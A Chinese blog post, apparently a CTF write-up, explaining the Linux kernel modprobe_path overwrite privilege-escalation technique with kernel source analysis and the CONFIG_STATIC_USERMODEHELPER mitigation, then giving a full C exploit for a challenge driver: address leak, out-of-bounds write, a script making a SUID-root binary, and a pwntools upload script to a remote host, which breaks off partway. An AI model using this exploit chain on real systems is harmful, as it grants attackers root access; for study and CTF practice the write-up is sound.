---
title: Linux Kernel modprobe_path覆盖利用技术
date: 2026-01-01 13:03:38
categories: Kernel
tags:
mathjax:
top:
---

## 前言

今年的 ccb&ciscn 初赛有一道 Linux 内核的 Pwn 题，让我这个内核菜鸡被直接“硬控”了。现在初赛都上内核了。。。

赛后搞到了 WP，于是正好趁着元旦假期有时间好好复现一下，分析了一下这道题的利用技术的原理，于是就有了这篇文章。

## 简介

`modprobe_path`覆盖利用技术是一种 Linux 内核漏洞利用方法，它可以让攻击者以 root 权限运行任意 shell 脚本。

`modprobe_path`覆盖利用技术的关键是覆盖掉`modprobe_path`内核全局变量，它的默认值为`/sbin/modprobe`程序的路径，`modprobe`是一个用于向 Linux 内核添加可加载内核模块，或从内核中移除可加载内核模块的工具。本质上它是一个用户态程序，当我们在 Linux 内核中安装或卸载新模块时会被执行。

我们可以通过运行以下命令检查：

```
❯ cat /proc/sys/kernel/modprobe
/sbin/modprobe
```

`modprobe_path`变量中的程序，会在我们执行一个系统无法识别文件类型的非法格式文件（无效魔数）时被调用。简单说一般我们执行 shell 文件时文件签名是`#!/bin/bash`，这是合法的文件格式，系统可以识别。而我们执行一个文件签名为`\xff\xff\xff\xff`的文件时内核会进行一系列操作，最终触发并以 root 权限执行`modprobe_path`变量中的程序。

因此如果我们将`modprobe_path`变量覆盖修改为想要执行的程序，然后再执行一个非法格式文件就可以以 root 权限执行我们想要执行的目标程序。

但是如果内核开启了`CONFIG_STATIC_USERMODEHELPER`内核配置选项，那么会将内核执行用户态 helper 的路径从运行时可变的全局变量改为编译期固定的常量，这样我们就无法对`modprobe_path`进行覆盖修改。

总结一下`modprobe_path`覆盖利用技术需要满足以下条件：

1. 能够任意地址写，可以覆盖`modprobe_path`变量；
2. 可以写两个任意文件：
   - 一个具有非法格式的文件，例如`\xff\xff\xff\xff`；
   - 另一个是一个 shell 脚本，用于执行想要以 root 权限完成的操作；
3. 能够执行非法格式文件；
4. 内核没有启用`CONFIG_STATIC_USERMODEHELPER`选项。

基本上，在大多数的 kernel pwn 题目中，条件 2 和条件 3 都是直接满足的，因此最关键的问题在于是否具备任意地址写的能力以及内核是否开启了`CONFIG_STATIC_USERMODEHELPER`选项。

询问了一下 GPT 给了一个检查内核是否开启`CONFIG_STATIC_USERMODEHELPER`选项的方法：

```shell
#修改modprobe
echo /tmp/test > /proc/sys/kernel/modprobe
#检查是否修改成功
cat /proc/sys/kernel/modprobe
```

如果修改成功则`CONFIG_STATIC_USERMODEHELPER`选项未开启，不成功则开启。

## 原理分析

接下来我们通过分析 Linux 内核的源代码，详细了解覆盖`modprobe_path`利用技术的原理。

当我们在 Linux Shell 中执行命令时（例如`bash`中执行`ls`），本质上会由 Shell 程序内部调用`execve`系统调用来加载并执行对应的程序。

### execve

`execve`系统调用会设置可执行文件路径、命令行参数数组以及环境变量数组等信息，然后调用`do_execve`，它才是真正负责执行程序加载的核心函数。

```c
SYSCALL_DEFINE3(execve,
    const char __user *, filename,      	  // 参数1：可执行文件路径
    const char __user *const __user *, argv,  // 参数2：命令行参数数组
    const char __user *const __user *, envp)  // 参数3：环境变量数组
{
	return do_execve(getname(filename), argv, envp); //getname从用户态读取filename
}
```

### do_execve

`do_execve`函数会对传入的可执行文件路径、参数数组和环境变量数组进行封装与处理，然后将执行流程统一转交给 `do_execveat_common`，由后者完成后续的程序加载与执行逻辑。

```c
static int do_execve(struct filename *filename,
	const char __user *const __user *__argv,
	const char __user *const __user *__envp)
{
	struct user_arg_ptr argv = { .ptr.native = __argv };
	struct user_arg_ptr envp = { .ptr.native = __envp };
    // AT_FDCWD为当前工作目录
	return do_execveat_common(AT_FDCWD, filename, argv, envp, 0);
}
```

### do_execveat_common

`do_execveat_common`负责构建并填充 `linux_binprm`，完成命令行参数和环境变量的准备工作。

`linux_binprm`是 Linux 内核中 描述一个即将被`execve`执行的可执行文件及其执行上下文的核心数据结构，是`execve`执行流程中的“载体”，保存了程序加载所需的全部信息。

`do_execveat_common`最终会调用`bprm_execve`，进入真正的二进制加载流程。`bprm_execve`是`execve`执行路径中最关键的通用入口函数。

```c
static int do_execveat_common(int fd, struct filename *filename,
			      struct user_arg_ptr argv,
			      struct user_arg_ptr envp,
			      int flags)
{
	struct linux_binprm *bprm; //描述
	int retval;

	if (IS_ERR(filename))
		return PTR_ERR(filename);

	if ((current->flags & PF_NPROC_EXCEEDED) &&  //防止进程数超限仍不断 exec
	    is_rlimit_overlimit(current_ucounts(), UCOUNT_RLIMIT_NPROC, rlimit(RLIMIT_NPROC))) {
		retval = -EAGAIN;
		goto out_ret;
	}

	current->flags &= ~PF_NPROC_EXCEEDED;

	bprm = alloc_bprm(fd, filename, flags);
	if (IS_ERR(bprm)) {
		retval = PTR_ERR(bprm);
		goto out_ret;
	}

	retval = count(argv, MAX_ARG_STRINGS);
	if (retval == 0)
		pr_warn_once("process '%s' launched '%s' with NULL argv: empty string added\n",
			     current->comm, bprm->filename);
	if (retval < 0)
		goto out_free;
	bprm->argc = retval;

	retval = count(envp, MAX_ARG_STRINGS);
	if (retval < 0)
		goto out_free;
	bprm->envc = retval;

	retval = bprm_stack_limits(bprm);
	if (retval < 0)
		goto out_free;

	retval = copy_string_kernel(bprm->filename, bprm);
	if (retval < 0)
		goto out_free;
	bprm->exec = bprm->p;

	retval = copy_strings(bprm->envc, envp, bprm);
	if (retval < 0)
		goto out_free;

	retval = copy_strings(bprm->argc, argv, bprm);
	if (retval < 0)
		goto out_free;

	if (bprm->argc == 0) {
		retval = copy_string_kernel("", bprm);
		if (retval < 0)
			goto out_free;
		bprm->argc = 1;
	}

	retval = bprm_execve(bprm); //进入真正的执行阶段
out_free:
	free_bprm(bprm);

out_ret:
	putname(filename);
	return retval;
}
```

### bprm_execve

`bprm_execve`函数会先对被加载程序的信息准备凭证与安全检查，最后调用`exec_binprm`函数加载可执行文件。

```c
static int bprm_execve(struct linux_binprm *bprm)
{
	int retval;

	retval = prepare_bprm_creds(bprm);  //准备执行凭据
	if (retval)
		return retval;

	check_unsafe_exec(bprm);
	current->in_execve = 1;  //执行状态标记，表示当前进程正处于 execve 中
	sched_mm_cid_before_execve(current); //检查是否允许执行，是否运行提权

	sched_exec();

	retval = security_bprm_creds_for_exec(bprm);
	if (retval)
		goto out;

	retval = exec_binprm(bprm);  //进入二进制加载核心
	if (retval < 0)
		goto out;

	sched_mm_cid_after_execve(current);

	current->in_execve = 0;
	rseq_execve(current);
	user_events_execve(current);
	acct_update_integrals(current);
	task_numa_free(current, false);
	return retval;

out:
	if (bprm->point_of_no_return && !fatal_signal_pending(current))
		force_fatal_sig(SIGSEGV);

	sched_mm_cid_after_execve(current);
	current->in_execve = 0;

	return retval;
}
```

### exec_binprm

`exec_binprm`函数负责在执行过程中选择并执行合适的二进制格式处理器，通过循环解析解释器链，最终完成可执行文件的确定并触发执行成功事件通知。

其中最重要的逻辑就是解析选择合适的二进制格式处理器部分，因此我们接下来需要跟进`search_binary_handler`函数分析。

```c
static int exec_binprm(struct linux_binprm *bprm)
{
	pid_t old_pid, old_vpid;
	int ret, depth;

	old_pid = current->pid;  //保存执行前的 PID 信息
	rcu_read_lock();
	old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current->parent));
	rcu_read_unlock();

	//解析主循环
	for (depth = 0;; depth++) {
		struct file *exec;
		if (depth > 5)
			return -ELOOP;

		ret = search_binary_handler(bprm);  //根据文件内容选择合适的处理器
		if (ret < 0)
			return ret;
		if (!bprm->interpreter)
			break;

		exec = bprm->file; // 解释器替换，下一轮执行的主角从原文件变成解释器本身
		bprm->file = bprm->interpreter;
		bprm->interpreter = NULL;

		allow_write_access(exec);
		if (unlikely(bprm->have_execfd)) {
			if (bprm->executable) {
				fput(exec);
				return -ENOEXEC;
			}
			bprm->executable = exec;
		} else
			fput(exec);
	}

    //执行成功后的系统通知
	audit_bprm(bprm);
	trace_sched_process_exec(current, old_pid, bprm);
	ptrace_event(PTRACE_EVENT_EXEC, old_vpid);
	proc_exec_connector(current);
	return 0;
}
```

### search_binary_handler

`search_binary_handler`函数会在`formats`链表中寻找合适的文件加载器。`formats`是一个包含所有已注册的可执行格式文件解析器。

```c
static int search_binary_handler(struct linux_binprm *bprm)
{
	bool need_retry = IS_ENABLED(CONFIG_MODULES);
	struct linux_binfmt *fmt;
	int retval;

	retval = prepare_binprm(bprm);  //读取文件前 128 字节
	if (retval < 0)
		return retval;

	retval = security_bprm_check(bprm);  //安全检查
	if (retval)
		return retval;

	retval = -ENOENT;
 retry:
	read_lock(&binfmt_lock);
    // 解析器匹配循环
	list_for_each_entry(fmt, &formats, lh) {
		if (!try_module_get(fmt->module))
			continue;
		read_unlock(&binfmt_lock);

		retval = fmt->load_binary(bprm);  //检查文件魔数，判断文件格式

		read_lock(&binfmt_lock);
		put_binfmt(fmt);
		if (bprm->point_of_no_return || (retval != -ENOEXEC)) {
			read_unlock(&binfmt_lock);
			return retval;
		}
	}
	read_unlock(&binfmt_lock);

    //没有找到解析器
	if (need_retry) {
		if (printable(bprm->buf[0]) && printable(bprm->buf[1]) &&
		    printable(bprm->buf[2]) && printable(bprm->buf[3]))
			return retval;
        
		if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
			return retval;
		need_retry = false;
		goto retry;
	}

	return retval;
}
```

常见的解析器：

- `elf_format`： ELF 可执行程序；
- `compat_elf_format`：兼容 ELF（与 ELF 基本相同）；
- `script_format`：`#!`开头的脚本；
- `misc_format`：其他格式，由内核模块注册。

每种解析器包含一个关键字段`load_binary`，其中包含着对应格式的加载函数。

检查文件魔数，匹配解析器：

```c
retval = fmt->load_binary(bprm);  //检查文件魔数，判断文件格式
```

例如 ELF 格式：

```c
//检查是否为 ELF 魔数 \x7FELF
if (memcmp(elf_ex->e_ident, ELFMAG, SELFMAG) != 0)
    goto out;
```

如果成功匹配到解析器，内核将调用该格式对应格式的加载函数完成可执行文件的加载（如 ELF 文件或 shell 文件）。

如果没有匹配到解析器，且文件的前 4 字节不可打印（非 ASCII），内核会进入一个兜底处理流程。在在该流程中，内核会根据可执行文件头部的魔数值，动态请求加载对应的 binfmt 内核模块。具体做法是从文件头的第 3、4 字节读取一个 16 位数值，并将其格式化为模块名 `binfmt-xxxx`，随后调用`request_module`触发模块加载：

```c
if (request_module("binfmt-%04x", *(ushort *)(bprm->buf + 2)) < 0)
    return retval;
```

### request_module

`request_module`其实是一个宏，真正执行的是`__request_module`函数：

```c
#define request_module(mod...) __request_module(true, mod)
```

`__request_module`函数最终会调用`call_modprobe`函数。

```c
int __request_module(bool wait, const char *fmt, ...)
{
	va_list args;
	char module_name[MODULE_NAME_LEN];
	int ret, dup_ret;

	WARN_ON_ONCE(wait && current_is_async());

	if (!modprobe_path[0])
		return -ENOENT;

	va_start(args, fmt);
	ret = vsnprintf(module_name, MODULE_NAME_LEN, fmt, args);
	va_end(args);
	if (ret >= MODULE_NAME_LEN)
		return -ENAMETOOLONG;

	ret = security_kernel_module_request(module_name);
	if (ret)
		return ret;

	ret = down_timeout(&kmod_concurrent_max, MAX_KMOD_ALL_BUSY_TIMEOUT * HZ);
	if (ret) {
		pr_warn_ratelimited("request_module: modprobe %s cannot be processed, kmod busy with %d threads for more than %d seconds now",
				    module_name, MAX_KMOD_CONCURRENT, MAX_KMOD_ALL_BUSY_TIMEOUT);
		return ret;
	}

	trace_module_request(module_name, wait, _RET_IP_);

	if (kmod_dup_request_exists_wait(module_name, wait, &dup_ret)) {
		ret = dup_ret;
		goto out;
	}

	ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);

out:
	up(&kmod_concurrent_max);

	return ret;
}
EXPORT_SYMBOL(__request_module);
```

### call_modprobe

`call_modprobe`是内核模块自动加载路径中真正执行用户态程序的函数：

```c
static int call_modprobe(char *orig_module_name, int wait)
{
	struct subprocess_info *info;
	static char *envp[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
		NULL
	};
	char *module_name;
	int ret;

	char **argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
	if (!argv)
		goto out;

	module_name = kstrdup(orig_module_name, GFP_KERNEL);
	if (!module_name)
		goto free_argv;

	argv[0] = modprobe_path;
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;
	argv[4] = NULL;

	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
	if (!info)
		goto free_module_name;

	ret = call_usermodehelper_exec(info, wait | UMH_KILLABLE);
	kmod_dup_request_announce(orig_module_name, ret);
	return ret;

free_module_name:
	kfree(module_name);
free_argv:
	kfree(argv);
out:
	kmod_dup_request_announce(orig_module_name, -ENOMEM);
	return -ENOMEM;
}
```

这部分代码的关键点：

通过`call_usermodehelper_setup`封装好`execve`需要的所有信息，然后调用`call_usermodehelper_exec`函数以 root 权限执行`modprobe_path`的值。

```c
	argv[0] = modprobe_path;
	argv[1] = "-q";
	argv[2] = "--";
	argv[3] = module_name;
	argv[4] = NULL;

	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
					 NULL, free_modprobe_argv, NULL);
	if (!info)
		goto free_module_name;

	ret = call_usermodehelper_exec(info, wait | UMH_KILLABLE);
```

默认的`modprobe_path`值是：

```c

char modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;
```

`CONFIG_MODPROBE_PATH`来自内核配置，默认为`/sbin/modprobe`。

所以如果我们修改了`modprobe_path`的值，并执行一个非法格式文件后就会执行`modprobe_path`的值。

## 利用思路总结

1. 首先通过任意地址写将`modprobe_path`的值覆盖为你的 shell 脚本；
2. 然后构造一个非法格式的文件（如`\xff\xff\xff\xff`）；
3. 执行它后内核会因为无法识别格式从而调用`request_module`函数；
4. 然后`request_module`调用`call_modprobe`函数执行`modprobe_path`的值；
5. 这时`modprobe_path`的值因为被覆盖为你的 shell 脚本，所以会以 root 权限执行它。

## 漏洞缓解方式

前面已经说过启用`CONFIG_STATIC_USERMODEHELPER`选项就会导致`modprobe_path`覆盖利用技术失效，这里结合代码分析一下原因。

在`call_usermodehelper_setup`中，如果`CONFIG_STATIC_USERMODEHELPER`配置选项启用，那么就会执行以下代码：

```c
#ifdef CONFIG_STATIC_USERMODEHELPER
	sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH;
```

此时内核会强制使用静态、编译时写死的路径，而忽略`modprobe_path`，从而使得`modprobe_path`覆盖技术失效。

```c
CONFIG_STATIC_USERMODEHELPER_PATH="/sbin/usermode-helper"
```

## 例题 ram_snoop

下载题目：https://pan.baidu.com/s/1by2RA-cR4w6TA1SOai2tsA?pwd=cv5d

### 题目分析

题目提供了三个文件：

- `bzImage`：内核镜像
- `rootfs.cpio`：文件系统
- `start.sh`：启动脚本

首先分析启动脚本：

```shell
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd  ./rootfs.cpio \
    -append "root=/dev/ram rdinit=/init console=ttyS0 oops=panic panic=1 quiet rodata=off" \
    -cpu qemu64,+smep,+smap \
    -smp cores=2,threads=1 \
    -nographic
```

保护机制：

- `+smep`：禁止内核执行用户态代码；
- `+smap`：禁止内核访问用户态数据；
- `rodata=off`：只读数据保护关闭。

只读数据保护关闭会导致`.rodata`段可写，这样的话即使`modprobe_path`是常量，也能被覆盖。这样就直接绕过了`CONFIG_STATIC_USERMODEHELPER`的防护。

然后解压`rootfs.cpio`分析文件系统

```shell
mkdir rootfs
cd rootfs
cpio -idvm < ../rootfs.cpio         
```

在`init`启动脚本中发现内核加载了`babydev.ko`内核模块，并在后台运行`eatFlag`程序。

```shell
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev

echo "[*] Welcome to Kernel PWN Environment"
echo "[*] Starting shell..."

insmod /home/babydev.ko
chmod 777 /dev/noc /tmp
cp /proc/kallsyms /tmp/coresysms.txt
/home/eatFlag &

exec /bin/sh
# exec su -s /bin/sh ctf
```

ida 逆向分析`eatFlag`程序发现它会在程序启动时读取`/flag`的内容并存放在堆内存中，然后删除该文件。所以我们只能从`eatflag`程序的堆内存中读取到 flag。

<img src="./assets/image-20260102165553583.png" alt="image-20260102165553583" style="zoom:50%;" />

`flag`指针是固定地址，很明显程序是没有开启 PIE 的，所以可以从`flag`指针读取 flag 的值。

<img src="./assets/image-20260102233035737.png" alt="image-20260102233035737" style="zoom:50%;" />

接着 ida 逆向分析`babydev.ko`模块，查看函数表的函数，其中`__pfx_`开头的是内核在符号层面生成的前缀符号。

<img src="./assets/image-20260102165240888.png" alt="image-20260102165240888" style="zoom:50%;" />

接下来首先分析`init_module`函数，它是内核模块加载入口。

- 分析`init_module`函数

`init_module`函数初始化了一个名为`noc`的字符设备，创建了`/dev/noc`供用户态交互，并分配了一个约 64KB 的全局内核堆缓冲区 `global_buf`。

<img src="./assets/image-20260102164620356.png" alt="image-20260102164620356" style="zoom:50%;" />

- 分析`dev_ioctl`函数

发现内核地址泄露漏洞：

<img src="./assets/image-20260103010855493.png" alt="image-20260103010855493" style="zoom:50%;" />

由于`dest`变量在站的布局之后就是`v11`变量。所以`copy_to_user`复制 40 字节的数据到用户态会将`v11`的值也给复制到用户态。

我们可以通过访问这个`ioctl`接口获取到泄露的数据。

<img src="./assets/image-20260103010932138.png" alt="image-20260103010932138" style="zoom:50%;" />

- 分析`dev_open`函数

`dev_open`在设备首次打开时分配一块内核堆内存，记录当前进程的 PID 和进程名，并将该堆指针保存到`file->private_data`，同时通过全局标志限制设备只能被单次打开。

<img src="./assets/image-20260102174239367.png" alt="image-20260102174239367" style="zoom:50%;" />

- 分析`dev_write`函数

函数中的`v4`变量是当前文件偏移，`v6`变量是实际写入长度。

当`v4 + a3 > 0x10000`时，驱动试图通过`v6 = -*a4`截断写入长度，但由于`v6`为无符号整型，该赋值触发了 signed 到 unsigned 的隐式转换，导致 `v6` 变成一个极大的正数。

随后该长度被直接用于`copy_from_user`，且写入地址由 `global_buf + data_start + f_pos`计算，在缺乏完整边界检查的情况下，最终形成可控偏移、可控长度的内核堆越界写漏洞。

<img src="./assets/image-20260103020917928.png" alt="image-20260103020917928" style="zoom:50%;" />

- 分析`dev_read`函数

`dev_read`根据`file->f_pos`从`global_buf`的有效数据区向用户态拷贝数据，并在读完后推进文件偏移。简单来说就是从驱动内部的缓冲区里，从当前偏移开始，复制一段数据给用户。

<img src="./assets/image-20260102174310538.png" alt="image-20260102174310538" style="zoom:50%;" />

- 分析`dev_seek`函数

该函数实现了设备的`lseek`操作（偏移定位），根据`a3`参数的值选择模式。如果`a3`为 1 则新位置为当前文件指针加上`a2`偏移参数。如果`a3`为 2 则新位置为文件末尾加上偏移。如果`a3`参数为 3，则新位置等于偏移。

通过这个函数我们可以控制文件偏移配合`dev_write`函数进行越界写利用。

<img src="./assets/image-20260102174328625.png" alt="image-20260102174328625" style="zoom: 50%;" />

- 分析`dev_release`函数

在关闭设备文件时原子递减打开计数并释放`filp->private_data`。

<img src="./assets/image-20260102165954280.png" alt="image-20260102165954280" style="zoom:50%;" />

- 分析`cleanup_module`函数

`cleanup_module`在模块卸载时释放`init_module`中申请的内核资源。

<img src="./assets/image-20260102165819152.png" alt="image-20260102165819152" style="zoom:50%;" />

### 利用思路

`modprobe_path`覆写：

- 通过`ioctl`泄露内核地址

```c
typedef struct {
    uint32_t proc_id;
    char proc_name[16];
    uint32_t mem_free;
    uint32_t mem_used;
    uint64_t mem_ptr;
} leak_data_t;

// 打开漏洞设备
int dev_fd = open("/dev/noc", O_RDWR); 
if (dev_fd < 0) return 1;
    
// 通过ioctl泄露内核信息
leak_data_t leak = {0}; 
ioctl(dev_fd, 0x83170405, &leak);
uint64_t kern_buf = leak.mem_ptr;
```

- 从`/proc/kallsyms`获取`modprobe_path`地址

```c
static uint64_t get_kernel_sym(const char *name) {
    FILE *fp = fopen("/tmp/coresysms.txt", "r"); //临时文件
    if (!fp) fp = fopen("/proc/kallsyms", "r");  //内核符号表路径
    if (!fp) return 0;
    
    char row[512], sym_name[256], sym_type;
    unsigned long long sym_addr;
    while (fgets(row, sizeof(row), fp)) {
        // 解析符号表格式：地址 类型 符号名
        if (sscanf(row, "%llx %c %255s", &sym_addr, &sym_type, sym_name) == 3) {
            if (!strcmp(sym_name, name)) {  // 找到目标符号
                fclose(fp); 
                return (uint64_t)sym_addr;
            }
        }
    }
    fclose(fp); 
    return 0;
}
// 获取内核符号 modprobe_path 地址函数
uint64_t target_sym = get_kernel_sym("modprobe_path");
```

- 计算`modprobe_path`与`kbase`的偏移

```c
// 分配填充数据
char *padding = malloc(0x10000); 
memset(padding, 'A', 0x10000);

// 写入大量数据填充缓冲区
write(dev_fd, padding, 0x10000); 
lseek(dev_fd, 0, SEEK_SET);  	// 重置文件偏移到文件开头
write(dev_fd, padding, 0x20);   // 再次写入部分数据
free(padding);

uint64_t offset = target_sym - kern_buf;  // 计算目标符号相对于内核缓冲区的偏移
    
// 拆分偏移：高56位作为基地址，低8位作为相对位置
uint64_t base_addr = offset & ~0xffULL;  // 清除低8位
uint64_t rel_pos = offset & 0xffULL;     // 只保留低8位
uint64_t end_addr = base_addr + 1;       // 结束地址
```

- 利用任意地址写漏洞修改设备内部的`start/end`指针

```c
char *exploit_buf = calloc(1, 0xffff);  // 构建利用缓冲区

for (int idx = 0; idx < 7; idx++)   	// 写入基地址
    exploit_buf[idx] = (base_addr >> (8 * (idx + 1))) & 0xff;

memcpy(exploit_buf + 7, &end_addr, 8);  // 写入结束地址
```

- 覆写`modprobe_path`为`/tmp/s`

```c
lseek(dev_fd, 0x10001, SEEK_SET);  	 // 定位到越界位置
write(dev_fd, exploit_buf, 0xffff);  // 写入利用数据
free(exploit_buf);

char hijack_path[0x40] = {0}; 
strcpy(hijack_path, "/tmp/s");  // 要写入 modprobe_path 的路径
 
// 定位到 modprobe_path 位置并写入新路径
lseek(dev_fd, (off_t)rel_pos, SEEK_SET);
write(dev_fd, hijack_path, sizeof(hijack_path));
close(dev_fd);
```

- 创建恶意脚本`/tmp/s`，将 exp 设置为 suid-root

```c
static void create_helper(const char *path, const char *script) {
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0777);  // 创建可执行文件
    write(fd, script, strlen(script)); 
    close(fd); 
    chmod(path, 0777);  // 设置执行权限
}

// 创建脚本/tmp/s，用于给当前程序设置 SUID 权限
create_helper(
    "/tmp/s",
    "#!/bin/sh\n"
    "chown root:root /tmp/exp\n"
    "chmod 4755 /tmp/exp\n"
);
```

- 执行非法格式文件触发`modprobe`机制

```c
// 触发 modprobe 执行函数
static void exec_trigger(void) {
    // 创建一个包含无效魔数的文件
    int fd = open("/tmp/dummy", O_CREAT | O_TRUNC | O_WRONLY, 0777);
    unsigned char header[4] = {0xff, 0xff, 0xff, 0xff};  // 无效魔数
    write(fd, header, 4); 
    close(fd); 
    chmod("/tmp/dummy", 0777); 
    system("/tmp/dummy");  // 执行触发文件
}

exec_trigger();
```

- 以 root 权限从`eatFlag`进程内存读取 flag

```c
// 搜索目标进程
static int search_target_proc(void) {
    DIR *dp = opendir("/proc");  // 打开/proc目录
    if (!dp) return -1;
    
    struct dirent *ent; 
    char link_path[128], real_path[256];
    while ((ent = readdir(dp))) {
        char *endp; 
        long proc_id = strtol(ent->d_name, &endp, 10);  // 转换为进程ID
        if (*endp) continue;  // 如果不是数字目录则跳过
        
        // 构建/proc/[pid]/exe符号链接路径
        snprintf(link_path, sizeof(link_path), "/proc/%ld/exe", proc_id);
        ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
        if (len > 0) { 
            real_path[len] = 0;  // 确保字符串结束
            // 检查是否是目标进程
            if (!strcmp(real_path, "/home/eatFlag")) { 
                closedir(dp); 
                return (int)proc_id;  // 返回目标进程ID
            }
        }
    }
    closedir(dp); 
    return -1;  // 未找到目标进程
}

// 读取 flag 函数
static void get_flag(void) {
    int proc_id = search_target_proc();  // 查找目标进程
    if (proc_id < 0) return;
    
    // 打开目标进程的内存文件
    char mem_file[64]; 
    snprintf(mem_file, sizeof(mem_file), "/proc/%d/mem", proc_id);
    int fd = open(mem_file, O_RDONLY); 
    if (fd < 0) return;
    
    // 读取flag指针，固定偏移0x407148
    uint64_t secret_ptr = 0; 
    pread(fd, &secret_ptr, 8, 0x407148);
    
    // 通过指针读取flag数据
    char secret_data[0x110] = {0}; 
    pread(fd, secret_data, 0x100, (off_t)secret_ptr);
    printf("[!] FLAG: %s\n", secret_data); //打印 flag
    close(fd);
}
```

### exp

- 完整的 exp：

```c
#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <dirent.h>

typedef struct {
    uint32_t proc_id;
    char proc_name[16];
    uint32_t mem_free;
    uint32_t mem_used;
    uint64_t mem_ptr;
} leak_data_t;

static uint64_t get_kernel_sym(const char *name) {
    FILE *fp = fopen("/tmp/coresysms.txt", "r");
    if (!fp) fp = fopen("/proc/kallsyms", "r");
    if (!fp) return 0;

    char row[512], sym_name[256], sym_type;
    unsigned long long sym_addr;
    while (fgets(row, sizeof(row), fp)) {
        if (sscanf(row, "%llx %c %255s", &sym_addr, &sym_type, sym_name) == 3) {
            if (!strcmp(sym_name, name)) {
                fclose(fp);
                return (uint64_t)sym_addr;
            }
        }
    }
    fclose(fp);
    return 0;
}

static int search_target_proc(void) {
    DIR *dp = opendir("/proc");
    if (!dp) return -1;

    struct dirent *ent;
    char link_path[128], real_path[256];
    while ((ent = readdir(dp))) {
        char *endp;
        long proc_id = strtol(ent->d_name, &endp, 10);
        if (*endp) continue;

        snprintf(link_path, sizeof(link_path), "/proc/%ld/exe", proc_id);
        ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
        if (len > 0) {
            real_path[len] = 0;
            if (!strcmp(real_path, "/home/eatFlag")) {
                closedir(dp);
                return (int)proc_id;
            }
        }
    }
    closedir(dp);
    return -1;
}

static void get_flag(void) {
    int proc_id = search_target_proc();
    if (proc_id < 0) return;

    char mem_file[64];
    snprintf(mem_file, sizeof(mem_file), "/proc/%d/mem", proc_id);
    int fd = open(mem_file, O_RDONLY);
    if (fd < 0) return;

    uint64_t secret_ptr = 0;
    pread(fd, &secret_ptr, 8, 0x407148);

    char secret_data[0x110] = {0};
    pread(fd, secret_data, 0x100, (off_t)secret_ptr);
    printf("[!] FLAG: %s\n", secret_data);
    close(fd);
}

static void create_helper(const char *path, const char *script) {
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0777);
    write(fd, script, strlen(script));
    close(fd);
    chmod(path, 0777);
}

static void exec_trigger(void) {
    int fd = open("/tmp/dummy", O_CREAT | O_TRUNC | O_WRONLY, 0777);
    unsigned char header[4] = {0xff, 0xff, 0xff, 0xff};
    write(fd, header, 4);
    close(fd);
    chmod("/tmp/dummy", 0777);
    system("/tmp/dummy");
}

int main(void) {
    if (geteuid() == 0) {
        get_flag();
        return 0;
    }

    uint64_t target_sym = get_kernel_sym("modprobe_path");

    int dev_fd = open("/dev/noc", O_RDWR);
    if (dev_fd < 0) return 1;

    leak_data_t leak = {0};
    ioctl(dev_fd, 0x83170405, &leak);
    uint64_t kern_buf = leak.mem_ptr;

    char *padding = malloc(0x10000);
    memset(padding, 'A', 0x10000);
    write(dev_fd, padding, 0x10000);
    lseek(dev_fd, 0, SEEK_SET);
    write(dev_fd, padding, 0x20);
    free(padding);

    uint64_t offset = target_sym - kern_buf;
    uint64_t base_addr = offset & ~0xffULL;
    uint64_t rel_pos = offset & 0xffULL;
    uint64_t end_addr = base_addr + 1;

    char *exploit_buf = calloc(1, 0xffff);
    for (int idx = 0; idx < 7; idx++)
        exploit_buf[idx] = (base_addr >> (8 * (idx + 1))) & 0xff;
    memcpy(exploit_buf + 7, &end_addr, 8);

    lseek(dev_fd, 0x10001, SEEK_SET);
    write(dev_fd, exploit_buf, 0xffff);
    free(exploit_buf);

    char hijack_path[0x40] = {0};
    strcpy(hijack_path, "/tmp/s");
    lseek(dev_fd, (off_t)rel_pos, SEEK_SET);
    write(dev_fd, hijack_path, sizeof(hijack_path));
    close(dev_fd);

	create_helper(
    	"/tmp/s",
	    "#!/bin/sh\n"
    	"chown root:root /tmp/exp\n"
	    "chmod 4755 /tmp/exp\n"
	);

    exec_trigger();

    execl("/tmp/exp", "exp", NULL);

    return 0;
}
```

- 编译：

```shell
#使用musl-gcc并剥离符号减少程序体积
musl-gcc -o exp exp.c -static -Os
strip exp
```

- 利用：

将`exp`放入文件系统并重打包。

```shell
mv exp ./rootfs
cd ./rootfs
find . -print0 | cpio --null -ov --format=newc > ../exp.cpio
```

然后修改启动脚本加载的文件系统为`exp.cpio`：

```shell
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd  ./exp.cpio \
    -monitor /dev/null \
    -append "root=/dev/ram rdinit=/init console=ttyS0 oops=panic panic=1 quiet rodata=off " \
    -cpu qemu64,+smep,+smap \
    -smp cores=2,threads=1 \
    -nographic \
    -snapshot
```

执行`exp`然后成功拿到 flag：

![image-20260102164125272](./assets/image-20260102164125272.png)

最后附上一个打远程的脚本：

```python
#!/usr/bin/env python3
from pwn import *
import base64, gzip

with open("./exp", 'rb') as f:
    binary_data = f.read()

compressed = gzip.compress(binary_data)
b64_data = base64.b64encode(compressed).decode('ascii')
lines = [b64_data[i:i+76] for i in range(0, len(b64_data), 76)]

io = remote("39.106.73.70", 30087)
io.recvuntil(b'/ $')

io.sendline(b'cat > /tmp/exp.gz.b64 << "EOF"')
for line in lines:
    io.sendline(line.encode())
io.sendline(b'EOF')
io.recvuntil(b'/ $')

